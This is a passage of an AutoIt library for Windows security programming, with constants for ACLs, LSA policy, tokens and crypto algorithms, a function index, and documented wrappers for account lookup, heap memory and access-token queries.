Global Const $SID_IS_UNKNOWN = 8
Global Const $SID_IS_COMPUTER = 9
Global Const $SID_IS_LABEL = 10
; =======================================================================

; #### INHERITANCE CONSTANTS ####
; =======================================================================
Global Const $NO_INHERITANCE = 0x0
Global Const $SUB_OBJECTS_ONLY_INHERIT            = 0x1
Global Const $SUB_CONTAINERS_ONLY_INHERIT         =0x2
Global Const $SUB_CONTAINERS_AND_OBJECTS_INHERIT = 0x3
Global Const $INHERIT_NO_PROPAGATE              =  0x4
Global Const $INHERIT_ONLY                        = 0x8
Global Const $INHERITED_ACCESS_ENTRY      =        0x10
Global Const $INHERITED_PARENT                    = 0x10000000
Global Const $INHERITED_GRANDPARENT           =    0x20000000
; =======================================================================

; #### STANDARD ACCESS RIGHTS ####
; =======================================================================
If Not IsDeclared("GENERIC_READ") Then Global Const $GENERIC_READ = 0x80000000
If Not IsDeclared("GENERIC_WRITE") Then Global Const $GENERIC_WRITE = 0x40000000
If Not IsDeclared("GENERIC_EXECUTE") Then Global Const $GENERIC_EXECUTE = 0x20000000
If Not IsDeclared("GENERIC_ALL") Then Global Const $GENERIC_ALL = 0x10000000
If Not IsDeclared("DELETE") Then Global Const $DELETE = 0x10000 ; Required to delete the object.
If Not IsDeclared("READ_CONTROL") Then Global Const $READ_CONTROL = 0x20000 ; Required to read the DACL information.
If Not IsDeclared("WRITE_DAC") Then Global Const $WRITE_DAC = 0x40000	; Required to change the DACL information.
If Not IsDeclared("WRITE_OWNER") Then Global Const $WRITE_OWNER = 0x80000	; Required to change the owner of the object.
If Not IsDeclared("ACCESS_SYSTEM_SECURITY") Then Global Const $ACCESS_SYSTEM_SECURITY = 0x1000000 ; Required to read or change the SACL security information of the object.
; =======================================================================

; LSA VARIABLES
; =======================================================================
GLOBAL $__LSA_ACE_INDEX_CURRENT_SELECT
GLOBAL $__LSA_ACE_POINTER_CURRENT_SELECT
GLOBAL $__LSA_ACL_POINTER_CURRENT_SELECT
GLOBAL $__LSA_SECURITY_USE_NAME = 1
; =======================================================================

; #### LSA DEDICATED KEY ####
; =======================================================================================
Local $p_LsaTempDedicatedKey = _LookupAccountName(_LsaGetUserName())
Local $s_LsaTempDedicatedKey = "#" & _ConvertSidToStringSid($p_LsaTempDedicatedKey) & "#"
$p_LsaTempDedicatedKey = _HeapFree($p_LsaTempDedicatedKey) * _FreeVariable($p_LsaTempDedicatedKey)

Global Const $LSA_DEDICATED_KEY0 = "_LocalSecurityAuthority_DedicatedKey0" & $s_LsaTempDedicatedKey 
Global Const $LSA_DEDICATED_KEY1 = "_LocalSecurityAuthority_DedicatedKey1" & $s_LsaTempDedicatedKey 
Global Const $LSA_DEDICATED_KEY2 = "_LocalSecurityAuthority_DedicatedKey2" & $s_LsaTempDedicatedKey 
Global Const $LSA_DEDICATED_KEY3 = "_LocalSecurityAuthority_DedicatedKey3" & $s_LsaTempDedicatedKey
; ======================================================================================= 

; LSA STRUCTURE CONSTANTS
; =======================================================================
Global Const $tagLUID = "dword Low;long High"
Global Const $tagLUIDANDATTR = $tagLUID & ";dword Attribute"
Global Const $tagTOKENPRIVILEGE = "dword Count;" & $tagLUIDANDATTR
Global Const $tagPRIVILEGESET = "dword Count;dword Control;" & $tagLUIDANDATTR
Global Const $tagTRUSTEE = "ptr pMultTrustee;int MultTrusteeOpe;int From;int Type;ptr Name"
Global Const $tagEXPLICITACCESS = "dword AccessMask;dword AccessMode;dword Inheritance;" & $tagTRUSTEE
Global Const $tagLSAANSI= "ushort Length;ushort MaxLength;ptr Buffer"
Global Const $tagLSAUNICODE = "ushort Length;ushort MaxLength;ptr Wbuffer"
Global Const $tagLSAOBJATTR = "ulong Length;hWnd RootDir;ptr objName;ulong Attr;ptr SecurDescr;ptr SecurQuality"
Global Const $tagACLSIZEINFO = "dword AceCount;dword BytesInUse;dword BytesFree"
Global Const $tagPOLICYAUDITEVENTSINFO = "int AuditMode;ptr EventAuditOpt;ulong MaxAuditEventCount"
Global Const $tagLSAUSERMODALS = "dword MinPwdLen;dword MaxPwdAge;dword MinPwdAge;dword ForceLogoff;dword PwdHistLen"
Global Const $tagSIDIDENTIFIERAUTHORITY = "byte Reserved[5];byte Authority"
Global Const $tagDATABLOB = "dword Length;ptr Buffer"
Global Const $tagCRYPTPROTECT_PROMPT = "dword Size;dword Flags;hWnd hWndOwner;ptr Prompt"
Global Const $tagSECRET = "ptr SecretName;byte Guid[16];ptr SecretData;ptr Sid1;ptr Sid2"
Global Const $tagUSERMODALSINFO3 = "dword Duration;dword ObservationWin;dword Threshold"
Global Const $tagACEHEADER = "byte AceType;byte AceFlags;short AceSize"
Global Const $tagACCESSALLOWEDACE = $tagACEHEADER & ";dword AccessMask;dword SidStart"
Global Const $tagACCESSACE = $tagACCESSALLOWEDACE
Global Const $tagTOKENSTATISTICS = "int64 TokenId;int64 AuthenticationId;int64 ExpirationTime;int TokenType;int ImpersonationLevel;dword DynamicCharged;dword DynamicAvailable;dword GroupCount;dword PrivilegeCount;int64 ModifiedId"
Global Const $tagSECUR_ATTRIBUTES = "int Size;ptr Securitydescriptor;int Inherit"
Const $tagOBJECT_ATTRIBUTES = "ulong Length;hWnd RootDir;ptr BufferW;ulong Attributes;ptr Securitydescriptor;ptr SecurityQualityOfService"
Global Const $tagQueryServiceCfg = "dword Type;dword StartType;dword ErrorCtrl;ptr BinPath;ptr LoadOrderGroup;dword TagId;ptr Dependence;ptr StartName;ptr DisplayName"
Global Const $tagServiceStatusProcess = "dword ServiceType;dword CurrentState;dword ControlsAccepted;dword Win32ExitCode;dword ServiceSpecificExitCode;dword CheckPoint;dword WaitHint;dword ProcessId;dword ServiceFlags"
; =======================================================================

; LSA POLICY ACCESS RIGHT CONSTANTS
; =======================================================================
Global Const $POLICY_VIEW_LOCAL_INFORMATION = 1
Global Const $POLICY_VIEW_AUDIT_INFORMATION = 2
Global Const $POLICY_GET_PRIVATE_INFORMATION = 4
Global Const $POLICY_TRUST_ADMIN = 8
Global Const $POLICY_CREATE_ACCOUNT = 16
Global Const $POLICY_CREATE_SECRET = 32
Global Const $POLICY_CREATE_PRIVILEGE = 64
Global Const $POLICY_SET_DEFAULT_QUOTA_LIMITS = 128
Global Const $POLICY_SET_AUDIT_REQUIREMENTS = 256
Global Const $POLICY_AUDIT_LOG_ADMIN = 512
Global Const $POLICY_SERVER_ADMIN = 1024
Global Const $POLICY_LOOKUP_NAMES = 2048
Global Const $POLICY_NOTIFICATION = 4096
; =======================================================================

; POLICY AUDIT EVENT OPTION CONSTANTS
; =======================================================================
Global Const $POLICY_AUDIT_SYSTEM = "AuditCategorySystem"
Global Const $POLICY_AUDIT_LOGON = "AuditCategoryLogon"
Global Const $POLICY_AUDIT_OBJECT_ACCESS = "AuditCategoryObjectAccess"
Global Const $POLICY_AUDIT_PRIVILEGE_USE = "AuditCategoryPrivilegeUse"
Global Const $POLICY_AUDIT_DETAILTRACKING = "AuditCategoryDetailedTracking"
Global Const $POLICY_AUDIT_POLICY_CHANGE = "AuditCategoryPolicyChange"
Global Const $POLICY_AUDIT_ACCOUNT_MANAGE = "AuditCategoryAccountManagement"
Global Const $POLICY_AUDIT_DIRECTORY_SERVICE_ACCESS = "AuditCategoryDirectoryServiceAccess"
Global Const $POLICY_AUDIT_ACCOUNT_LOGON = "AuditCategoryAccountLogon"
; =======================================================================

; POLICY AUDIT EVENT CONSTANTS
; =======================================================================
Global Const $POLICY_AUDIT_EVENT_UNCHANGED = 0
Global Const $POLICY_AUDIT_EVENT_SUCCESS = 1
Global Const $POLICY_AUDIT_EVENT_FAILURE = 2
Global Const $POLICY_AUDIT_EVENT_NONE = 4
Global Const $POLICY_AUDIT_EVENT_MASK = bitOR(0, 1, 2, 4)
; =======================================================================

; USER ACCOUNT FILETER CONSTANTS
; =======================================================================
Global Const $FILTER_ALL_USER_ACCOUNTS = 0
Global Const $FILTER_TEMP_DUPLICATE_ACCOUNT = 1
Global Const $FILTER_NORMAL_ACCOUNT = 2
Global Const $FILTER_PROXY_ACCOUNT = 4
Global Const $FILTER_INTERDOMAIN_TRUST_ACCOUNT = 8
Global Const $FILTER_WORKSTATION_TRUST_ACCOUNT = 0x10
Global Const $FILTER_SERVER_TRUST_ACCOUNT = 0x20
; =======================================================================

; #### LOGON TYPE CONSTANTS ####
; =======================================================================
Global Const $LOGON32_LOGON_INTERACTIVE  = 2
Global Const $LOGON32_LOGON_NETWORK       = 3
Global Const $LOGON32_LOGON_BATCH        = 4
Global Const $LOGON32_LOGON_SERVICE      = 5

; #### LOGON PROVIDER CONSTANTS ####
; =======================================================================
Global Const $LOGON32_PROVIDER_DEFAULT  =  0
Global Const $LOGON32_PROVIDER_WINNT35   = 1
Global Const $LOGON32_PROVIDER_WINNT40   = 2
Global Const $LOGON32_PROVIDER_WINNT50   = 3
; =======================================================================

; #### LSA SECRET CONSTANTS ####
; =======================================================================
Global Const $SECRET_INFORMATION_NAME = 0
Global Const $SECRET_INFORMATION_GUID = 1
Global Const $SECRET_INFORMATION_DATA = 2
Global Const $SECRET_INFORMATION_SID1 = 4
Global Const $SECRET_INFORMATION_SID2 = 8
; =======================================================================

; #### USER ACCOUNT RID (Relative Identifier) CONSTANTS ####
; =======================================================================
Global Const $DOMAIN_ALIAS_RID_ADMINS = 0x00000220
Global Const $DOMAIN_ALIAS_RID_USERS  = 0x00000221
Global Const $DOMAIN_ALIAS_RID_GUESTS = 0x00000222
Global Const $DOMAIN_ALIAS_RID_POWER_USERS = 0x00000223
Global Const $DOMAIN_ALIAS_RID_ACCOUNT_OPS = 0x00000224
Global Const $DOMAIN_ALIAS_RID_SYSTEM_OPS = 0x00000225
Global Const $DOMAIN_ALIAS_RID_PRINT_OPS = 0x00000226
Global Const $DOMAIN_ALIAS_RID_BACKUP_OPS = 0x00000227
Global Const $DOMAIN_ALIAS_RID_REPLICATOR = 0x00000228
; =======================================================================

; #### CRYPTOGRAPHY VERIFICATION OBJECT GLOBAL CONSTANTS ####
; =======================================================================
Global Const $CRYPT_OBJECT_STRING = 0
Global Const $CRYPT_OBJECT_FILE = 1
Global Const $CRYPT_OBJECT_SERVICE = 2
Global Const $CRYPT_OBJECT_REGISTRY_KEY = 3
Global Const $CRYPT_OBJECT_LMSHARE = 4
Global Const $CRYPT_OBJECT_KERNEL = 5
; =======================================================================

; #### CRYPTOGRAPHY VERIFICATION MASK GLOBAL CONSTANTS ####
; =======================================================================
Global Const $CRYPT_MASK_DATA = 1
Global Const $CRYPT_MASK_TIME = 2
Global Const $CRYPT_MASK_ATTRIBUTES = 4
Global Const $CRYPT_MASK_OWNER = 8
Global Const $CRYPT_MASK_GROUP = 0x10
Global Const $CRYPT_MASK_DACL = 0x20
Global Const $CRYPT_MASK_SACL = 0x40
Global Const $CRYPT_MASK_TYPE = 0x80
Global Const $CRYPT_MASK_STATE = 0x100
Global Const $CRYPT_MASK_SELF = 0x200
Global Const $CRYPT_MASK_SYNCHRONIZE = 0x400
Global Const $CRYPT_MASK_PARAM = 0x800
; =======================================================================

; #### ALG_ID (ALGORIGHM IDENTIFER) CONSTANTS ####
; =======================================================================
Global Const $CALG_3DES = 0x6603
Global Const $CALG_3DES_112 = 0x6609
Global Const $CALG_AES = 0x6611
Global Const $CALG_AES_128 = 0x660e
Global Const $CALG_MD2 = 0x8001
Global Const $CALG_MD4 = 0x8002
Global Const $CALG_SHA = 0x8004
Global Const $CALG_SHA1 = $CALG_SHA
Global Const $CALG_MD5 = 0x8003
Global Const $CALG_MAC = 0x8005
Global Const $CALG_SHA_256 = 0x800c
Global Const $CALG_SHA_384 = 0x800d
Global Const $CALG_SHA_512 = 0x800e
Global Const $CALG_RC2 = 0x6602
Global Const $CALG_RC4 = 0x6801
Global Const $CALG_RC5 = 0x660d
Global Const $CALG_RSA_KEYX = 0xa400
Global Const $CALG_RSA_SIGN = 0x2400
; =======================================================================

; #### CRYPT PROTECT DATA CONSTANTS ####
; =======================================================================
Global Const $CRYPTPROTECT_LOCAL_MACHINE = 4
Global Const $CRYPTPROTECT_UI_FORBIDDEN = 1
Global Const $CRYPTPROTECT_AUDIT = 16
Global Const $CRYPTPROTECT_VERIFY_PROTECTION = 64
Global Const $CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1
Global Const $CRYPTPROTECT_PROMPT_ON_PROTECT = 2
; =======================================================================

; #### FUNCTIONS ####
; =======================================================================
; _AccessCheck
; _AddAce
; _AddAceEx
; _AddAceEx1
; _AdjustPolicyAuditEvents
; _AdjustTokenPrivileges
; _AllocateAndInitializeSid
; _AllocateGUID
; _AllocateLUID
; _BuildSecurityDescriptor
; _CheckAclMemberShip
; _CheckTokenMembership
; _CombineAcl
; _ConvertSdToStringSd
; _ConvertSidToStringSid
; _ConvertStringSdToSd
; _ConvertStringSidToSid
; _CopySid
; _CreateProcessAsSystem
; _CreateProcessAsUser
; _CreateProcessWithLogon
; _CreateWellKnownSid
; _CryptAcquireContext
; _CryptBinaryToString
; _CryptCreateHash
; _CryptDecrypt
; _CryptDestroyHash
; _CryptDestroyKey
; _CryptDuplicateHash
; _CryptDuplicateKey
; _CryptEncrypt
; _CryptGenKey
; _CryptGetHashParam
; _CryptHashCeritificate
; _CryptHashData
; _CryptProtectData
; _CryptReleaseContext
; _CryptStringToBinary
; _CryptUnprotectData
; _CryptVerifyObjectHashValue
; _DeleteAce
; _DeleteAceByOwner
; _DuplicateAcl
; _DuplicateTokenEx
; _EqualPrefixSid
; _EqualSid
; _FreeSid
; _FreeVariable
; _GetAce
; _GetAclInformation
; _GetAuditedPermissionsFromAcl
; _GetEffectiveRightsFromAcl
; _GetExplicitAce
; _GetExplicitEntriesFromAcl
; _GetExplicitEntriesFromAcl1
; _GetLastError
; _GetLengthSid
; _GetNamedSecurityInfo
; _GetProcessHeap
; _GetSecurityDescriptorDacl
; _GetSecurityDescriptorGroup
; _GetSecurityDescriptorLength
; _GetSecurityDescriptorOwner
; _GetSecurityDescriptorSacl
; _GetSecurityInfo
; _GetSidIdentifierAuthority
; _GetSidSubAuthority
; _GetSidSubAuthorityCount
; _GetTokenGroups
; _GetTokenImpersonationLevel
; _GetTokenInformation
; _GetTokenOwner
; _GetTokenPrivileges
; _GetTokenSource
; _GetTokenType
; _GetTokenUser
; _GUIDFromString
; _HeapAlloc
; _HeapFree
; _HeapSize
; _ImpersonateLoggedOnUser
; _ImpersonateSystemContext
; _InitializeAcl
; _InitializeExplicitAccess
; _InitializeLuid
; _InitializeSecurityDescriptor
; _InitializeTrustee
; _IsNtfs
; _IsPrivilegeEnabled
; _IsTokenRestricted
; _IsValidAce
; _IsValidAcl
; _IsValidSecurityDescriptor
; _IsValidSid
; _IsWellKnownSid
; _LogonUser
; _LookupAccountName
; _LookupAccountSid
; _LookupPrivilegeDisplayName
; _LookupPrivilegeName
; _LookupPrivilegeOnLoggedUser
; _LookupPrivilegeValue
; _LsaAccountRightIsEnabled
; _LsaAddAccountRight
; _LsaAddLocalGroup
; _LsaAddLocalUser
; _LsaApiBufferFree
; _LsaApiBufferSize
; _LsaAu3LibraryIsIncluded
; _LsaClose
; _LsaCloseHandle
; _LsaCloseServiceHandle
; _LsaCreateSecret
; _LsaCreateSecretManager
; _LsaDeleteSecret
; _LsaDelLocalGroup
; _LsaDelLocalUser
; _LsaEnumerateAccountRights
; _LsaEnumerateAccountsWithUserRight
; _LsaEnumerateLocalAccounts
; _LsaEnumerateLocalGroups
; _LsaEnumerateLogonSessions
; _LsaEnumerateSecrets
; _LsaEnumerateWellKnownAccounts
; _LsaFreeMemory
; _LsaFreeReturnBuffer
; _LsaGetLogonSessionData
; _LsaGetSecret
; _LsaGetUserName
; _LsaGetUserRelativeID
; _LsaHiLong64
; _LsaInitializeBufferW
; _LsaLocalFree
; _LsaLocalGroupAddMembers
; _LsaLocalGroupDelMembers
; _LsaLocalGroupGetMembers
; _LsaLocalSize
; _LsaLocalUserGetGroups
; _LsaLocalUserGetInfo
; _LsaLocalUserGetPasswordPolicy
; _LsaLocalUserSetForceLogoff
; _LsaLocalUserSetMaxPasswordAge
; _LsaLocalUserSetMinPasswordAge
; _LsaLocalUserSetMinPasswordLength
; _LsaLocalUserSetModals
; _LsaLocalUserSetPasswordHistLength
; _LsaLoLong64
; _LsaLookupAccountsRight
; _LsaMakeLong64
; _LsaNtStatusToWinError
; _LsaOpenPolicy
; _LsaOpenSCManager
; _LsaOpenService
; _LsaQuerySecret
; _LsaRemoveAccountRight
; _LsaRetrieveFingerprint
; _LsaRetrievePrivateData
; _LsaStorePrivateData
; _LsaStringIsUserAccount
; _MakeAbsoluteSD
; _MakeSelfRelativeSD
; _OpenProcess
; _OpenProcessToken
; _QueryFileSecurity
; _QueryFileSecurityDacl
; _QueryFileSecurityOwner
; _QueryKernelObjectSecurity
; _QueryKernelObjectSecurityDacl
; _QueryKernelObjectSecurityOwner
; _QueryPolicyAuditEvents
; _QueryServiceObjectSecurity
; _QueryServiceObjectSecurityDacl
; _QueryServiceObjectSecurityOwner
; _QueryServiceObjectSecuritySacl
; _QueryShareObjectSecurityDacl
; _QueryShareObjectSecurityOwner
; _RegCloseKey
; _RegGetKeySecurity
; _RegGetKeySecurityDacl
; _RegGetKeySecurityOwner
; _RegGetKeySecuritySacl
; _RegOpenKeyEx
; _RegSetKeySecurity
; _RegSetKeySecurityDacl
; _RegSetKeySecurityOwner
; _RevertToSelf
; _SetAccessControlEntriesOrder
; _SetEntriesInAcl
; _SetEntriesInAcl1
; _SetFileSecurity
; _SetFileSecurityDacl
; _SetFileSecurityOwner
; _SetKernelObjectSecurity
; _SetKernelObjectSecurityDacl
; _SetKernelObjectSecurityOwner
; _SetNamedSecurityInfo
; _SetSecurityDescriptorDacl
; _SetSecurityDescriptorGroup
; _SetSecurityDescriptorOwner
; _SetSecurityDescriptorSacl
; _SetSecurityInfo
; _SetServiceObjectSecurity
; _SetServiceObjectSecurityDacl
; _SetServiceObjectSecurityOwner
; _SetServiceObjectSecuritySacl
; _SetShareObjectSecurityDacl
; _StringFromGUID
; =======================================================================

; #### FUNCTION ####
; =======================================================================
; Name	: _LookupAccountName
; Description	: Retrieves the SID pointer of the specified user account from the specified system.
; Parameter(s)	: $sName	- The name of the user account.
;		: $sSystem	- An optional string contains the system name on which the function executes, default to local.
; Return values	: If succeeds, returns a SID pointer, else sets @error to a system error code.
; Author	: Pusofalse
; Remarks	: When you finished with the SID pointer, call _HeapFree function to free it.
; =======================================================================
Func _LookupAccountName($sName, $sSystem = "")
	Local $iResult, $pSid, $pDomain, $iSysError

	$iResult = DllCall("Advapi32.dll", "int", "LookupAccountName", _
			"str", $sSystem, "str", $sName, "ptr", 0, "int*", 0, _
			"ptr", 0, "int*", 0, "int*", 0)
	$pSid = _HeapAlloc($iResult[4])
	$pDomain = _HeapAlloc($iResult[6])
	$iResult = DllCall("Advapi32.dll", "int", "LookupAccountName", _
			"str", $sSystem, "str", $sName, _
			"ptr", $pSid, "int*", $iResult[4], _
			"ptr", $pDomain, "int*", $iResult[6], "int*", 0)
	$iSysError = _GetLastError()
	_HeapFree($pDomain)
	Return SetError($iSysError, $iResult[7], $pSid)
EndFunc	;==>_LookupAccountName

; #### FUNCTION ####
; =======================================================================
; Name	: _HeapFree
; Description	: Free the memory allocated by _HeapAlloc function.
; Parameter(s)	: $pMem	- A pointer to the block of memory, returned by _HeapAlloc function.
; Return values	: True indicates success, false to failure.
; Author	: Pusofalse
; Remarks	: The _Query*Security functions and some SID-related functions require the $pMem parameter, When you finished with this pointer, must call this function to free it, else, the running application must crumble!!!
; =======================================================================
Func _HeapFree(ByRef $pMem)
	If $pMem < 1 Then Return SetError(87, 0, False)

	Local $iResult, $hHeap = _GetProcessHeap()
	$iResult = DllCall("Kernel32.dll", "int", "HeapFree", "hWnd", $hHeap, _
			"dword", 0, "ptr", $pMem)
	If $iResult[0] Then $pMem = Ptr(0)
	Return $iResult[0] <> 0
EndFunc	;==>_HeapFree

; #### FUNCTION ####
; =======================================================================
; Name	: _HeapAlloc
; Description	: Allocates a block of memory from the process heap.
; Parameter(s)	: $iSize	- The size of block.
;		: $iAllocOption - Allocation option, default to ZERO_MEMORY.
; Return values	: If succeeds, returns a pointer to the newly allocated memory block.
; Author	: Pusofalse
; Remarks		: When you no longer use this pointer, call _HeapFree function to free it.
; =======================================================================
Func _HeapAlloc($iSize, $iAllocOption = 8)
	If $iSize < 1 Then Return 0

	Local $pMem, $hHeap = _GetProcessHeap()
	$pMem = DllCall("Kernel32.dll", "ptr", "HeapAlloc", "hWnd", $hHeap, _
			"dword", $iAllocOption, "dword", $iSize)
	Return $pMem[0]
EndFunc	;==>_HeapAlloc

; #### INTERNAL USED ONLY FUNCTION ####
; =======================================================================
; Retrieves the handle to the process heap, _HeapAlloc function requires it.
; =======================================================================
Func _GetProcessHeap()
	Local $hHeap = DllCall("Kernel32.dll", "hWnd", "GetProcessHeap")
	Return $hHeap[0]
EndFunc	;==>_GetProcessHeap

; #### FUNCTION ####
; =======================================================================
; Name	: _HeapSize
; Description	: Retrieves the size of the memory block.
; Parameter(s)	: $pMem	- A pointer to the memory block, returned by _HeapAlloc function.
; Return values	: If succeeds, returns the size of the memory block.
; Author	: Pusofalse
; =======================================================================
Func _HeapSize($pMem)
	If $pMem < 1 Then Return 0
	Local $iSize, $hHeap

	$hHeap = _GetProcessHeap()
	$iSize = DllCall("Kernel32.dll", "long", "HeapSize", "hWnd", $hHeap, _
			"dword", 0, "ptr", $pMem)
	Return $iSize[0]
EndFunc	;==>_HeapSize

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaLocalSize
; Description	: Retrieves the size of the memory block.
; Parameter(s)	: $pMem	- A pointer to a memory block.
; Return values	: If suceeds, returns the size of the memory block.
; Author	: Pusofalse
; Remarks		: You can determine the size of the pointer to the access control list returned by _SetEntriesInAcl function.
; =======================================================================
Func _LsaLocalSize($pMem)
	Local $iSize = DllCall("Kernel32.dll", "long", "LocalSize", "ptr", $pMem)
	Return $iSize[0]
EndFunc	;==>_LsaLocalSize

; #### INTERNAL USED ONLY FUNCTION ####
; =======================================================================
; Retrieves the error code last set by the calling thread.
; =======================================================================
Func _GetLastError()
	Local $iSysError = DllCall("Kernel32.dll", "long", "GetLastError")
	Return $iSysError[0]
EndFunc	;==>_GetLastError

; #### FUNCTION ####
; =======================================================================
; Name	: _LookupAccountSid
; Description	: Retrieves the user account name string corresponded to the SID.
; Parameter(s)	: $pSid	- A SID pointer.
;		: $sSystem	- The system name on which the function to execute, default to local system.
; Return values	: If succeeds, returns a string contains the name of the user account.
; Author	: Pusofalse
; =======================================================================
Func _LookupAccountSid($pSid, $sSystem = "")
	Local $iResult, $sResult, $iSysError

	If Not _IsValidSid($pSid) Then Return SetError(@error, 0, "")
	$iResult = DllCall("Advapi32.dll", "int", "LookupAccountSid", _
			"str", $sSystem, "ptr", $pSid, "str", "", "int*", 0, _
			"str", "", "int*", 0, "int*", 0)
	$iResult = DllCall("Advapi32.dll", "int", "LookupAccountSid", _
			"str", $sSystem, "ptr", $pSid, _
			"str", "", "int*", $iResult[4], _
			"str", "", "int*", $iResult[6], "int*", 0)
	$iSysError = _GetLastError()
	$sResult = $iResult[3]
	If $iResult[5] Then $sResult = $iResult[5] & "\" & $iResult[3]
	Return SetError($iSysError, $iResult[7], $sResult)
EndFunc	;==>_LookupAccountSid

; #### FUNCTION ####
; =======================================================================
; Name	: _OpenProcess
; Description	: Open a process and retrieve its handle.
; Parameter(s)	: $iProcessId	- The process ID or image name.
;		: $iAccess	- Access rights, default to PROCESS_ALL_ACCESS.
;		: $iInherit	- True indicates the handle will be inherited by the child process, default to false.
; Return values	: If succeeds, returns the handle to the process, else returns zero and sets @error to a system error code.
; Author	: Pusofalse
; Remarks	: When you finished with the handle, call _LsaCloseHandle function to close it.
; =======================================================================
Func _OpenProcess($iProcessId, $iAccess = 0x1F0FFF, $iInherit = 0)
	Local $hProcess

	If $iProcessId = -1 Then $iProcessId = @AutoItPid
	$iProcessId = ProcessExists($iProcessId)
	If $iProcessId = 0 Then Return SetError(2, 0, 0)
	$hProcess = DllCall("Kernel32.dll", "long", "OpenProcess", _
			"int", $iAccess, "int", $iInherit, "int", $iProcessId)
	Return SetError(_GetLastError(), 0, $hProcess[0])
EndFunc	;==>_OpenProcess

; #### FUNCTION ####
; =======================================================================
; Name	: _OpenProcessToken
; Description	: Open the access token associated with the specified process and retrieve its handle.
; Parameter(s)	: $iProcessId	- Process ID or image name from which the access token is returned.
;		: $iAccess	- TOKEN ACCESS RIGHTS, default to TOKEN_ALL_ACCESS.
; Return values	: If succeeds, returns the handle to the access token, otherwise returns zero and sets @error.
; Author	: Pusofalse
; Remarks	: When you finished with the handle, call _LsaCloseHandle function to close it.
; =======================================================================
Func _OpenProcessToken($iProcessId, $iAccess = $TOKEN_ALL_ACCESS)
	Local $iResult, $hProcess
	If $iProcessId = -1 Then $iProcessId = @AutoItPid
	$iProcessId = ProcessExists($iProcessId)
	$hProcess = _OpenProcess($iProcessId, 0x400)
	If Not $hProcess Then Return SetError(@ERROR, 0, 0)

	$iResult = DllCall("Advapi32.dll", "int", "OpenProcessToken", _
			"hWnd", $hProcess, "dword", $iAccess, "long*", 0)
	Return SetError(_GetLastError(), _LsaCloseHandle($hProcess), $iResult[3])
EndFunc	;==>_OpenProcessToken

; #### INTERNAL USED ONLY FUNCTION ####
; =======================================================================
; Retrieves the information of the access token, _GetToken* functions require this function.
; =======================================================================
Func _GetTokenInformation($hToken, $iTokenInfo)
	Local $pBuffer, $iResult

	$iResult = DllCall("Advapi32.dll", "int", "GetTokenInformation", _
			"hWnd", $hToken, "int", $iTokenInfo, _
			"ptr", 0, "dword", 0, "dword*", 0)
	$pBuffer = _HeapAlloc($iResult[5])
	$iResult = DllCall("Advapi32.dll", "int", "GetTokenInformation", _
			"hWnd", $hToken, "int", $iTokenInfo, _
			"ptr", $pBuffer, "dword", $iResult[5], "dword*", 0)
	Return SetError(_GetLastError(), $iResult[0], $pBuffer)
EndFunc	;==>_GetTokenInformation

; #### FUNCTION ####
; =======================================================================
; Name	: _GetTokenGroups
; Description	: Retrieves the group information of the access token.
; Parameter	: $hToken	- Handle to the access token.
; Return values	: An array with following format:
;		:	- $array[0][0] - The number of entries returned.
;		:	- $array[1][0] - The name of the first group.
;		:	- $array[1][1] - The Attribute of the SID of the first group.
;		:	- $array[2][0] - The name of the second group.
;		:	- ... ...
; Author	: Pusofalse
; =======================================================================
Func _GetTokenGroups($hToken)
	Local $pBuffer, $tBuffer, $tNum, $aResult[1][3], $tagBuffer, $iSysError, $pSid

;	_GetTokenPrivileges($hToken)
	$pBuffer = _GetTokenInformation($hToken, 2)
	$iSysError = @error
	$tNum = DllStructCreate("dword", $pBuffer)
	$aResult[0][0] = DllStructGetData($tNum, 1)
	Redim $aResult[$aResult[0][0] + 1][3]
	For $i = 1 to $aResult[0][0]
		$tagBuffer &= ";ptr;dword"
	Next
	$tBuffer = DllStructCreate("dword" & $tagBuffer, $pBuffer)
	For $i = 1 to $aResult[0][0]
		$pSid = DllStructGetData($tBuffer, ($i - 1) * 2 + 2)
		$pSid = _CopySid($pSid)
		$aResult[$i][2] = DllStructGetData($tBuffer, ($i - 1) * 2 + 3)
		$aResult[$i][0] = _LookupAccountSid($pSid)
		$aResult[$i][1] = _ConvertSidToStringSid($pSid)
		_HeapFree($pSid)
	Next
	_HeapFree($pBuffer)
	_FreeVariable($tNum)
	_FreeVariable($tBuffer)
	Return SetError($iSysError, 0, $aResult)
EndFunc	;==>_GetTokenGroups

; #### FUNCTION ####
; =======================================================================
; Name	: _GetTokenType
; Description	: Return an integer value indicating whether the token is a primary or impersonation token.
; Parameters	: $hToken	- The handle to the access token to be checked.
; Return values	: If $hToken is a primary token, returns 1, if $hToken is an impersonation token, returns 2.
; Author		: Pusofalse
; =======================================================================
Func _GetTokenType($hToken)
	Local $pBuffer, $tBuffer, $iType, $iSysError

	$pBuffer = _GetTokenInformation($hToken, 8)
	$iSysError = @error
	$tBuffer = DllStructCreate("dword", $pBuffer)
	$iType = DllStructGetData($tBuffer, 1)
	_FreeVariable($tBuffer)
	Return SetError($iSysError, _HeapFree($pBuffer), $iType)
EndFunc	;==>_GetTokenType

; #### FUNCTION ####
; =======================================================================
; Name	: _GetTokenImpersonationLevel
; Description	: Retrieve the impersonation-level of the specified access token.
; Parameter(s)	: $hToken	- Handle to the access token.
; Return values	: If succeeds, returns the level of impersonation of the token, else sets @error.
; Author	: Pusofalse
; =======================================================================
Func _GetTokenImpersonationLevel($hToken)
	Local $pBuffer, $tBuffer, $iSysError, $iLevel

	$pBuffer = _GetTokenInformation($hToken, 9)
	$iSysError = @error
	$tBuffer = DllStructCreate("dword", $pBuffer)
	$iLevel = DllStructGetData($tBuffer, 1)
	_FreeVariable($tBuffer)
	Return SetError($iSysError, _HeapFree($pBuffer), $iLevel)
EndFunc	;==>_GetTokenImpersonationLevel

; #### FUNCTION ####
; =======================================================================
; Name	: _GetTokenOwner
; Description	: Retrieves the owner the access token.
; Parameter(s)	: $hToken	- Handle to the access token.
; Return values	: If succeeds, returns the owner of the token, in string format. Otherwise returns NULL and sets @error.
; Author	: Pusofalse
; =======================================================================
Func _GetTokenOwner($hToken)
	Local $pBuffer, $tBuffer, $iSysError, $sOwner, $pSid

	$pBuffer = _GetTokenInformation($hToken, 4)
	$iSysError = @error
	$tBuffer = DllStructCreate("ptr", $pBuffer)
	$pSid = DllStructGetData($tBuffer, 1)
	$sOwner = _LookupAccountSid($pSid)
	_FreeVariable($tBuffer)
	Return SetError($iSysError, _HeapFree($pBuffer), $sOwner)
EndFunc	;==>_GetTokenOwner

; #### FUNCTION ####
; =======================================================================
; Name	: _GetTokenUser
; Description	: Retrieves the user associated with specified token.
